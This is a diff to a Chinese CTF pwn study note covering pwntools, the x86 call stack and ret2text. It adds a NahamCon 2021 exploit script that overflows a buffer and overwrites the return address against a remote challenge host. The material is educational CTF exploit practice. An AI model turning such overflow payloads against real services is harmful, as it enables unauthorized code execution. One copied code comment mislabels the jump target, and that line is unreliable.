@@ -44,13 +44,12 @@ Installation:
 
 ## pwntools
 
-> python包
->
-> Github repo: https://github.com/Gallopsled/pwntools
+> python包    Github repo: https://github.com/Gallopsled/pwntools
 >
 > docs: https://docs.pwntools.com/en/latest/
 
 - pwn工具集. `pwntools` is a CTF framework and exploit development library. CTF框架，python包
+- WARNING: 网上很多使用pwntools的脚本是基于python2的，需要注意str byte转换，以及可能存在的API行为改变
 
 ```python
 from pwn import *
@@ -606,7 +605,7 @@ Stack Overflow Workflow:
 
 ### 函数调用栈
 
-- 函数调用栈的典型内存布局如下所示。包含caller和callee，包含寄存器和临时变量的栈帧布局
+- 函数调用栈的典型内存布局（x86-32bit）如下所示。包含caller和callee，包含寄存器和临时变量的栈帧布局
 
 ![](https://raw.githubusercontent.com/hex-16/pictures/master/CTF_pic/pwn_function_stack_caller_and_callee.jpg)
 
@@ -845,7 +844,7 @@ sh.interactive() # 将代码交互转换为手工交互
 > 案例ret2text见  https://github.com/hex-16/CTF-detailed-writeups/tree/main/pwn/demo_ROP_ret2text , 所使用的脚本：
 >
 > ```python
-> # python3 pwntools
+> # python3 pwntools # demo_ROP_ret2text
 > from pwn import *
 > sh = process('./ret2text')
 > target = 0x804863a # 这个是 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
@@ -863,6 +862,19 @@ sh.interactive() # 将代码交互转换为手工交互
 > 比赛案例：
 >
 > - NahamCon 2021 (ctf.nahamcon.com): Ret2basic: 没开canary等保护，找到打开`flag.txt`的函数，覆盖return address就行了，栈分析可以用gdb也可以用IDA(没分析错)。
+>
+> ```python
+> # NahamCon 2021 (ctf.nahamcon.com): Ret2basic # 
+> # 0x0000000000401334   call    _gets
+> from pwn import *
+> context.log_level = 'debug'
+> sh = remote('challenge.nahamcon.com', 30413)
+> # 这个是前面分析的 mov dword ptr [esp], offset command ; command: "/bin/sh" 的地址 后面一条指令是 call  _system
+> target = 0x0000000000401215
+> payload = b'A' * (0x70 + 8) + p64(target)  # 这里是前面分析的字符串 s 与 return address 之间的偏移量
+> sh.sendline(payload)
+> sh.interactive()
+> ```
 
 
 
